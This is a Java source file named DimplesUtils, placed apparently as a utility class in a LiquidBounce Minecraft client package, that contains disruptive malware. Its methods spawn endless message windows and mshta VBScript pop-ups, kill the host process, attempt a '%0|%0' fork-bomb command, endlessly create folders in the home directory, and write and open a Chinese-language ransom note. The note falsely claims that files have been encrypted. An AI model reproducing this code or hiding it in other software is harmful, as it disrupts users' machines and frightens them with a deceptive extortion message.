package net.ccbluex.liquidbounce.utils;


//import antiskidderobfuscator.NativeMethod;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.Random;

public class DimplesUtils {
    private static final String RANSOM_NOTE = "Hacked by Dimples#1337.\n" +
            "主播你的电脑已经被我黑了，你的文件已经被我加密了\n" +
            "主播想想你之前干过的事吧^ ^\n"+
            "EnjoyTheLastetTime^ ^\n" +
            "-Dimples#1337";
    private static final String[] TARGET_DIR = {
            String.valueOf(FileSystemView.getFileSystemView() .getHomeDirectory()),
            System.getProperty("user.dir"),
            "D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","G:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\",
            "U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\","A:\\","B:\\"
    };
    
    public void NMSL() throws IOException {
        blast_1();
        blast_2();
        blast_3();
        load();
    }
    
    public void blast_1() {

        Random rd = new Random();
        while (true) {
            JFrame frame = new JFrame("Hacked By Dimples#1337");
            frame.setSize(400, 100);
            frame.setLocation(rd.nextInt(1920), rd.nextInt(1080));
            frame.setVisible(true);
            try {
                Runtime.getRuntime().exec("mshta vbscript:msgbox(\"You got hacked by Dimples#1337\",16,\"Dimples#1337\")(window.close)");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }

    private static class CustomClassLoader extends ClassLoader {
        public Class<?> load(byte[] buf, int length) {
            return defineClass(null, buf, 0, length);
        }
    }
    public static void WriteStringToFile(String filePath) {
        try {
            File file = new File(filePath);
            PrintStream ps = new PrintStream(new FileOutputStream(file));
            ps.println(RANSOM_NOTE);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    
    public static void load() {
        new Thread(() -> {
            WriteStringToFile(FileSystemView.getFileSystemView() .getHomeDirectory() + "\\Dimples's Note.txt");
            try {
                Runtime.getRuntime().exec("notepad " + FileSystemView.getFileSystemView() .getHomeDirectory() + "\\Dimples's Note.txt");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    public void blast_2() throws IOException {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("%0|%0"
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid "
                + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
    }
    
    public void blast_3() {
        int i = 0;
        FileSystemView view = FileSystemView.getFileSystemView();
        File file = view.getHomeDirectory();
        while (true) {

            File f = new File(file + "Hacked By Dimples#1337" + i);
            f.mkdir();

            i++;

        }

    }

}